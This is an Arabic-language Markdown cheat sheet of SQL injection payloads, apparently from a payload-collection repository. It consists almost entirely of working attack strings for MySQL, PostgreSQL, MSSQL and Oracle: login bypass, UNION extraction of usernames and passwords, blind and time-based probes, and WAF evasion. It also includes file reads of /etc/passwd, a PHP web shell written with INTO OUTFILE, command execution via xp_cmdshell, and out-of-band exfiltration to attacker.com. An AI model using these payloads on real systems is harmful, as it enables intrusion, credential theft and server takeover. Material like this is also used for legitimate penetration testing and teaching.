<a id="-sql-injection-payloads"></a>
# 💉 حمولات حقن SQL

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [حمولات الكشف](#-detection-payloads)
- [تجاوز المصادقة](#-authentication-bypass)
- [الحقن باستخدام UNION](#-union-based-injection)
- [الحقن المعتمد على الأخطاء](#-error-based-injection)
- [حقن SQL الأعمى](#-blind-sql-injection)
- [الحقن المعتمد على الزمن](#-time-based-injection)
- [حمولات خاصة بنظام إدارة قاعدة البيانات (DBMS)](#-dbms-specific)
- [تجاوز جدار حماية تطبيقات الويب (WAF)](#-waf-bypass)
- [قناة اتصال خارجية (Out-of-Band)](#-out-of-band)

---

<a id="-detection-payloads"></a>
## 🔍 حمولات الكشف

<a id="basic-detection"></a>
### الكشف الأساسي

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

<a id="boolean-detection"></a>
### الكشف بالشروط المنطقية

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

<a id="arithmetic-detection"></a>
### الكشف بالعمليات الحسابية

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

<a id="string-concatenation"></a>
### ربط السلاسل النصية

```sql
' || 'test
' + 'test
' 'test
```

---

<a id="-authentication-bypass"></a>
## 🔓 تجاوز المصادقة

<a id="login-bypass"></a>
### تجاوز تسجيل الدخول

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

<a id="username-field"></a>
### حقل اسم المستخدم

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

<a id="password-field"></a>
### حقل كلمة المرور

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

<a id="common-bypass-combinations"></a>
### تركيبات شائعة للتجاوز

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

<a id="-union-based-injection"></a>
## 🔗 الحقن باستخدام UNION

<a id="finding-columns"></a>
### تحديد عدد الأعمدة

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

<a id="basic-union"></a>
### استخدام UNION الأساسي

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

<a id="data-extraction"></a>
### استخراج البيانات

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

<a id="union-with-comments"></a>
### استخدام UNION مع التعليقات

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-error-based-injection"></a>
## ⚠️ الحقن المعتمد على الأخطاء

<a id="mysql-error-based"></a>
### الحقن المعتمد على الأخطاء في MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

<a id="mssql-error-based"></a>
### الحقن المعتمد على الأخطاء في MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

<a id="postgresql-error-based"></a>
### الحقن المعتمد على الأخطاء في PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

<a id="oracle-error-based"></a>
### الحقن المعتمد على الأخطاء في Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

<a id="-blind-sql-injection"></a>
## 🔮 حقن SQL الأعمى

<a id="boolean-based-blind"></a>
### الحقن الأعمى بالشروط المنطقية

```sql
-- شرط صحيح
' AND 1=1--
' AND 'a'='a'--

-- شرط خاطئ
' AND 1=2--
' AND 'a'='b'--

-- استخراج المحارف
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

<a id="binary-search"></a>
### البحث الثنائي

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

<a id="length-detection"></a>
### تحديد الطول

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

<a id="tablecolumn-enumeration"></a>
### تعداد الجداول والأعمدة

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-time-based-injection"></a>
## ⏱️ الحقن المعتمد على الزمن

<a id="mysql"></a>
### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

<a id="postgresql"></a>
### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

<a id="mssql"></a>
### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

<a id="oracle"></a>
### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-dbms-specific"></a>
## 🗄️ حمولات خاصة بنظام إدارة قاعدة البيانات (DBMS)

<a id="mysql-payloads"></a>
### حمولات MySQL

```sql
-- الإصدار
' UNION SELECT @@version--
' UNION SELECT version()--

-- المستخدم الحالي
' UNION SELECT user()--
' UNION SELECT current_user()--

-- قاعدة البيانات
' UNION SELECT database()--

-- الجداول
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- الأعمدة
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- قراءة ملف
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- كتابة ملف
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

<a id="postgresql-payloads"></a>
### حمولات PostgreSQL

```sql
-- الإصدار
' UNION SELECT version()--

-- المستخدم الحالي
' UNION SELECT current_user--

-- قاعدة البيانات
' UNION SELECT current_database()--

-- الجداول
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- قراءة ملف
' UNION SELECT pg_read_file('/etc/passwd')--

-- تنفيذ الأوامر
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

<a id="mssql-payloads"></a>
### حمولات MSSQL

```sql
-- الإصدار
' UNION SELECT @@version--

-- المستخدم الحالي
' UNION SELECT SYSTEM_USER--

-- قاعدة البيانات
' UNION SELECT DB_NAME()--

-- الجداول
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- تنفيذ الأوامر
'; EXEC xp_cmdshell 'whoami';--

-- تفعيل xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

<a id="oracle-payloads"></a>
### حمولات Oracle

```sql
-- الإصدار
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- المستخدم الحالي
' UNION SELECT user FROM dual--

-- قاعدة البيانات
' UNION SELECT ora_database_name FROM dual--

-- الجداول
' UNION SELECT table_name FROM all_tables--

-- الأعمدة
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-waf-bypass"></a>
## 🛡️ تجاوز جدار حماية تطبيقات الويب (WAF)

<a id="space-bypass"></a>
### تجاوز ترشيح المسافات

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

<a id="comment-bypass"></a>
### التجاوز باستخدام التعليقات

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

<a id="case-variation"></a>
### تغيير حالة الأحرف

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

<a id="encoding"></a>
### الترميز

```sql
-- ترميز URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- ترميز URL مزدوج
%2527%20OR%201=1--

-- الترميز الست عشري
' UNION SELECT 0x61646d696e--  (admin in hex)
```

<a id="keyword-bypass"></a>
### تجاوز ترشيح الكلمات المفتاحية

```sql
-- تجاوز ترشيح UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- تجاوز ترشيح SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- تجاوز ترشيح AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

<a id="hpp-http-parameter-pollution"></a>
### تلوث معاملات HTTP ‏(HPP)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

<a id="-out-of-band"></a>
## 📡 قناة اتصال خارجية (Out-of-Band)

<a id="mysql-oob"></a>
### قناة خارجية في MySQL ‏(OOB)

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

<a id="mssql-oob"></a>
### قناة خارجية في MSSQL ‏(OOB)

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

<a id="postgresql-oob"></a>
### قناة خارجية في PostgreSQL ‏(OOB)

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

<a id="oracle-oob"></a>
### قناة خارجية في Oracle ‏(OOB)

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="detection-order"></a>
### ترتيب الكشف

1. `'` - علامة اقتباس مفردة
2. `"` - علامة اقتباس مزدوجة
3. `' OR '1'='1` - حقن بشرط منطقي
4. `' AND SLEEP(5)--` - يعتمد على الزمن
5. `' UNION SELECT NULL--` - يعتمد على UNION

<a id="common-endpoints"></a>
### نقاط النهاية الشائعة

```
- نماذج تسجيل الدخول
- حقول البحث
- معرّفات المستخدمين في عناوين URL
- قيم ملفات تعريف الارتباط
- ترويسات HTTP ‏(User-Agent, Referer)
- معاملات API
```

<a id="sql-comments-by-dbms"></a>
### تعليقات SQL حسب نظام إدارة قاعدة البيانات

| DBMS | التعليقات |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

<a id="-resources"></a>
## 📚 مصادر

- [مرجع حقن SQL من PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 ترسانة حمولات حقن SQL</b><br>
  <i>للأغراض التعليمية فقط!</i>
</p>
